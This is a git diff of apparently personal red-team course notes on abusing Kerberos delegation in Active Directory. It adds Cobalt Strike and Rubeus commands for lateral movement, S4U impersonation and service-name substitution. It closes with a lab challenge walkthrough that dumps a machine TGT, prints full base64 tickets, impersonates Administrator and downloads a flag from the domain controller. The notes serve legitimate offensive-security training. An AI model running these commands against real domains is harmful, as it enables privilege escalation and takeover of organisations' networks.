@@ -44,6 +44,20 @@ Privileged Attribute Certificate
 	- **AP-REP:** (Optional/Mutual Auth) The server decrypts the ticket using its own hash, extracts the session key, and sends back a confirmation to the client.
 	- **Authorization:** The server inspects the **PAC (Privilege Attribute Certificate)** inside the ticket to determine the user's group memberships and permissions.
 
+#### Lateral Movement Services Cheat Sheet
+All of the [lateral movement](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=674b793699b3a08430017d88) techniques that are covered in this section rely on Windows protocols that are designed to facilitate remote administration. This helps blend lateral movement with legit admin.
+
+This table provides guidance on what service tickets are required to access services useful for lateral movement and data access.
+
+| **Name** | **Description**                                                      | **Ticket(s)**                          |
+| -------- | -------------------------------------------------------------------- | -------------------------------------- |
+| SMB      | Access the remote filesystem.  View, list, upload, & delete files.   | CIFS                                   |
+| PsExec   | Run a binary via the Service Control Manager.                        | CIFS                                   |
+| WinRM    | Windows Remote Management.                                           | HTTP                                   |
+| WMI      | Execute applications on the remote target, e.g. process call create. | RPCSS  <br>HOST  <br>RestrictedKrbHost |
+| RDP      | Remote Desktop Protocol.                                             | TERMSRV  <br>HOST                      |
+| MSSQL    | MS SQL Databases.                                                    | MSSQLSvc                               |
+
 ## Unconstrained Delegation
 Kerberos "delegation" is a feature that allows one principal to request access to resources on behalf of another principal.
 	ie: Users of a web app perform operations that require a backend service such as MSSQL, the web app acts in their place.
@@ -78,6 +92,8 @@ Abusing Unconstrained Delegation
 beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
 
 # Move laterally to vulnerable computer (See 10 Lateral Movement)
+beacon> make_token [DOMAIN\user] [password]  # examples
+beacon> jump psexec64 lon-ws-1 smb  # BAD OPSEC
 
 # Monitor for TGTs as user's authenticate to services
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
@@ -127,13 +143,15 @@ Abusing S4U
 ```powershell
 # Query to identify hosts with CONSTRAINED DELEGATION & Services vulnerable
 beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo # Annotate hosts and service
-	# IF SERVICES ARE WEAK, proceed to Service Name Substitution
+	# IF WE NEED TO CHANGE THE SERVICE, proceed to Service Name Substitution
 
 # Check if TRUSTED_TO_AUTH_FOR_DELEGATION flag is set
 beacon> ldapsearch (&(samAccountType=805306369)(samaccountname=[hostname]$)) --attributes userAccountControl 
 [Convert]::ToBoolean([UAC VALUE] -band 16777216) #True = PROTOCOL TRANSITION set
 
-# Move laterally to host identified to begin attack (See Lateral Movement)
+# Move laterally to vulnerable computer (See 10 Lateral Movement)
+beacon> make_token [DOMAIN\user] [password]  # examples
+beacon> jump psexec64 lon-ws-1 smb  # BAD OPSEC
 ```
 Attacking S4U with Protocol Transition Enabled
 	When protocol transition is enabled, the adversary can obtain a TGT for the computer account and use it to perform an S4U2self request.  They have complete freedom in what username they put in the TGS-REQ, so can impersonate any user in the domain.
@@ -215,7 +233,9 @@ Service Name Substitution (Protocol Substitution enabled)
 ```powershell
 ## First identify computers vulnerable to controlled delegation, if protocol transition is enabled, and their services (see Controlled Delegation section above)
 
-# Laterally move to vulnerable computers
+# Move laterally to vulnerable computer (See 10 Lateral Movement)
+beacon> make_token [DOMAIN\user] [password]  # examples
+beacon> jump psexec64 lon-ws-1 smb  # BAD OPSEC
 
 # Triage and dump computer TGT
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
@@ -232,7 +252,7 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user
 # Inject service ticket into logon session
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:[DOMAIN] /username:Administrator /password:FakePass /ticket:[ticket] # spawn logon session
 beacon> steal_token [PID]  # Impersonate spawned process
-beacon> run klist          # Verify ticket is present
+beacon> run klist          # BAD OPSEC - Verify ticket is present
 
 # Abuse as necessary.
 beacoon> ls \\[dc hostname]\c$ # example
@@ -257,6 +277,8 @@ S4U2Self Computer Takeover Attack
 beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
 
 # Move laterally to vulnerable computer (See 10 Lateral Movement)
+beacon> make_token [DOMAIN\user] [password]  # examples
+beacon> jump psexec64 lon-ws-1 smb  # BAD OPSEC
 
 # Monitor for tickets (from high integrity beacon on vulnerable computer)
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:5 /nowrap
@@ -319,7 +341,7 @@ Requirements to abuse RBCD to gain access to any computer:
 
 NOTE: It's much easier to enumerate and abuse RBCD through a SOCKS proxy. 
 
-Abusing RBCD
+Abusing RBCD - can replace IPs with hostnames ;)
 ```powershell
 REQUIREMENTS SECTION
 # Enumerating ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
@@ -390,16 +412,38 @@ PS C:\Users\Attacker> Get-ADComputer -Identity 'lon-fs-1' -Properties Principals
 ```
 
 
-## Lateral Movement Services
-All of the [lateral movement](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=674b793699b3a08430017d88) techniques that we covered rely on Windows protocols that are designed to facilitate remote administration. This helps blend lateral movement with legit admin.
 
-This table provides guidance on what service tickets are required to access services useful for lateral movement and data access.
+## Challenge
 
-| **Name** | **Description**                                                      | **Ticket(s)**                          |
-| -------- | -------------------------------------------------------------------- | -------------------------------------- |
-| SMB      | Access the remote filesystem.  View, list, upload, & delete files.   | CIFS                                   |
-| PsExec   | Run a binary via the Service Control Manager.                        | CIFS                                   |
-| WinRM    | Windows Remote Management.                                           | HTTP                                   |
-| WMI      | Execute applications on the remote target, e.g. process call create. | RPCSS  <br>HOST  <br>RestrictedKrbHost |
-| RDP      | Remote Desktop Protocol.                                             | TERMSRV  <br>HOST                      |
-| MSSQL    | MS SQL Databases.                                                    | MSSQLSvc                               |
+unconstrained check
+	just the DC
+	:(
+
+constrained delegation check
+	sAMAccountName: LON-WKSTN-1$ ( we are on this box)
+	msDS-AllowedToDelegateTo: ldap/lon-dc-1.contoso.com, ldap/lon-dc-1
+	retreived 1 results total
+	ok
+	check if protocol transition is set
+		True
+
+move laterally
+	(we are already on the box)
+
+triage and dump computer tgt
+	`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap`
+doIFjDCCBYigAwIBBaEDAgEWooIEoDCCBJxhggSYMIIElKADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBFowggRWoAMCARKhAwIBAqKCBEgEggREZ0VT4++8aKHNYuGeBzJS2rrUALXxDx/Wyjap4VDWo12cLNp+Muc15u0Xfg8C8I1PLVpkUrARvYvMBBJhAkJhH8fisu3EXV/3+0E4S8+ceRgPcO3cn7vYntWpUkbZ4Y20zm2lKJJe5SCBQAOH7JJU4ItTRdGIDQsWMYFjaOtLMf8HiMtS7AMcEmcP0fI7JHsp3b8x0nsRxFz2TB69EJV29iba3HMzf5EwVaAnPOpQOCSTBgCFyIt9aHkwG+mRHrlQQzJLVgC5JRSIQhX27TQ4eyLlJzxETeph3c0IpCrCWVjowSkZTdqYVcNaeYEBKVq4yv22LWSyQuSfigsU6zjcYMISHdUjJIexweT86xaUdYJzMQDjOukfMZGNmhD2nT+BaArOs+3hBcb3iEwZv6Bz0NVwsOGy/VxFJ7lqUxz0AGu3RmYBC8AF7a4haJS90XEKu953TQEhPWiqZCMZEFpXXEU8ZiqKkg00mxF4oVtIg4f2gT4YZ3BcP1gy0Spqktp+VwBmndpAVVf+qCnfdmofqe/R4pJQnIvHPHXZSAC2ZHitoslX40pkhHuYfEDcM3dV34ZpevZJaLDmejXDBXZTB8NQ6vlD2k39wxS+Rpytq4kELANy+axgbUKakAoHc4mKOaWNuzPXcfCM9bYKSBcKkYz+bclg9xqBMlmWjiKm4Ool4Z5FrVQQBXrCWMACLCItlypWZ+Jktq8L+gOfweN5vWiHyg2Z/KrdD5UkK2TgW0c1UGtwK10LTjQqtCvZcnZRF8Hl+g+BltoA22EbPVi8aIGiV4OXasS5+/EDZJi1pwa6wQZ7WLdI917Lkqwvprgx00oPS0C+5OHMy7MfrR5xAdOxNpZ3Pfn6xhP2wtxPYMv1xaouAz8gP9yPRePheA4LmOEqTk8OIlupdY2O4Htkw9zEL2Ma3fATTOFtquciQJj9Z8IcKcJU2znYYkEQCbzknz04vz7ejs+3whgo/q1Kfg6oPRsKdrodbe6bO2L1LfO0ixGBAtzjkuYKJCYnOJxdsxO/egwy0A/cXxCkixXWHGcJ6CQ6Bc2C21Y3EfMgs/tPIiDq4bPNQWG+slgGIUWMhlf38mGF4HnvH0RQIiRnpfUJ6RVRIHrlCd3z9flQ6QColtthbmnwOaF3wfuZyxCW0TjInFt5ep3A3C4zCJRuGUwghtRU49x6wQ4yBnfL8HyIO4nJ3HHulxSKbdiiOgWS/awuh/yI6sHDYkoHxkZ7EG67Yq2LNXhydhbXkQ69Ba4LMEtW+SIQInwaG1dc1DJj4mV/7PKwY2GwaQygERLPXT+vgJgvMRwd++3mYJmwnvm9ZA/os86U58t3yKDmqPkd/rmjeJl+6sOZVqyhPjTTLL7i8Hy7XsYNnL5HJdVr+jlDLTA8/K0fmF1raRR7fp6jPA72fAPI7udkq1NLDup2ZVXhKdSqJAcZhu34E+b9s89dUHHto4HXMIHUoAMCAQCigcwEgcl9gcYwgcOggcAwgb0wgbqgGzAZoAMCARehEgQQ/dnb7dnMg3NDATg4nwfA76ENGwtDT05UT1NPLkNPTaIZMBegAwIBAaEQMA4bDExPTi1XS1NUTi0xJKMHAwUAYKEAAKURGA8yMDI2MDEwMTE2NDUzN1qmERgPMjAyNjAxMDIwMjI2NTJapxEYDzIwMjYwMTA4MTYyNjUyWqgNGwtDT05UT1NPLkNPTakgMB6gAwIBAqEXMBUbBmtyYnRndBsLQ09OVE9TTy5DT00=
+
+S4U attack - impersonate admin and change service
+	`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /msdsspn:ldap/lon-dc-1 /altservice:cifs /ticket:doIFjDCCBYigAwIBBaEDAgEWooIEoDCCBJxhggSYMIIElKADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBFowggRWoAMCARKhAwIBAqKCBEgEggREZ0VT4++8aKHNYuGeBzJS2rrUALXxDx/Wyjap4VDWo12cLNp+Muc15u0Xfg8C8I1PLVpkUrARvYvMBBJhAkJhH8fisu3EXV/3+0E4S8+ceRgPcO3cn7vYntWpUkbZ4Y20zm2lKJJe5SCBQAOH7JJU4ItTRdGIDQsWMYFjaOtLMf8HiMtS7AMcEmcP0fI7JHsp3b8x0nsRxFz2TB69EJV29iba3HMzf5EwVaAnPOpQOCSTBgCFyIt9aHkwG+mRHrlQQzJLVgC5JRSIQhX27TQ4eyLlJzxETeph3c0IpCrCWVjowSkZTdqYVcNaeYEBKVq4yv22LWSyQuSfigsU6zjcYMISHdUjJIexweT86xaUdYJzMQDjOukfMZGNmhD2nT+BaArOs+3hBcb3iEwZv6Bz0NVwsOGy/VxFJ7lqUxz0AGu3RmYBC8AF7a4haJS90XEKu953TQEhPWiqZCMZEFpXXEU8ZiqKkg00mxF4oVtIg4f2gT4YZ3BcP1gy0Spqktp+VwBmndpAVVf+qCnfdmofqe/R4pJQnIvHPHXZSAC2ZHitoslX40pkhHuYfEDcM3dV34ZpevZJaLDmejXDBXZTB8NQ6vlD2k39wxS+Rpytq4kELANy+axgbUKakAoHc4mKOaWNuzPXcfCM9bYKSBcKkYz+bclg9xqBMlmWjiKm4Ool4Z5FrVQQBXrCWMACLCItlypWZ+Jktq8L+gOfweN5vWiHyg2Z/KrdD5UkK2TgW0c1UGtwK10LTjQqtCvZcnZRF8Hl+g+BltoA22EbPVi8aIGiV4OXasS5+/EDZJi1pwa6wQZ7WLdI917Lkqwvprgx00oPS0C+5OHMy7MfrR5xAdOxNpZ3Pfn6xhP2wtxPYMv1xaouAz8gP9yPRePheA4LmOEqTk8OIlupdY2O4Htkw9zEL2Ma3fATTOFtquciQJj9Z8IcKcJU2znYYkEQCbzknz04vz7ejs+3whgo/q1Kfg6oPRsKdrodbe6bO2L1LfO0ixGBAtzjkuYKJCYnOJxdsxO/egwy0A/cXxCkixXWHGcJ6CQ6Bc2C21Y3EfMgs/tPIiDq4bPNQWG+slgGIUWMhlf38mGF4HnvH0RQIiRnpfUJ6RVRIHrlCd3z9flQ6QColtthbmnwOaF3wfuZyxCW0TjInFt5ep3A3C4zCJRuGUwghtRU49x6wQ4yBnfL8HyIO4nJ3HHulxSKbdiiOgWS/awuh/yI6sHDYkoHxkZ7EG67Yq2LNXhydhbXkQ69Ba4LMEtW+SIQInwaG1dc1DJj4mV/7PKwY2GwaQygERLPXT+vgJgvMRwd++3mYJmwnvm9ZA/os86U58t3yKDmqPkd/rmjeJl+6sOZVqyhPjTTLL7i8Hy7XsYNnL5HJdVr+jlDLTA8/K0fmF1raRR7fp6jPA72fAPI7udkq1NLDup2ZVXhKdSqJAcZhu34E+b9s89dUHHto4HXMIHUoAMCAQCigcwEgcl9gcYwgcOggcAwgb0wgbqgGzAZoAMCARehEgQQ/dnb7dnMg3NDATg4nwfA76ENGwtDT05UT1NPLkNPTaIZMBegAwIBAaEQMA4bDExPTi1XS1NUTi0xJKMHAwUAYKEAAKURGA8yMDI2MDEwMTE2NDUzN1qmERgPMjAyNjAxMDIwMjI2NTJapxEYDzIwMjYwMTA4MTYyNjUyWqgNGwtDT05UT1NPLkNPTakgMB6gAwIBAqEXMBUbBmtyYnRndBsLQ09OVE9TTy5DT00= /impersonateuser:Administrator /nowrap`
+obtained service ticket
+
+spawn sacrificial process and inject tgs into session
+	`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket: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
+
+steal_token 10000
+
+ls `\\lon-dc-1\c$
+download `\\lon-dc-1\c$\flag.txt
+
+
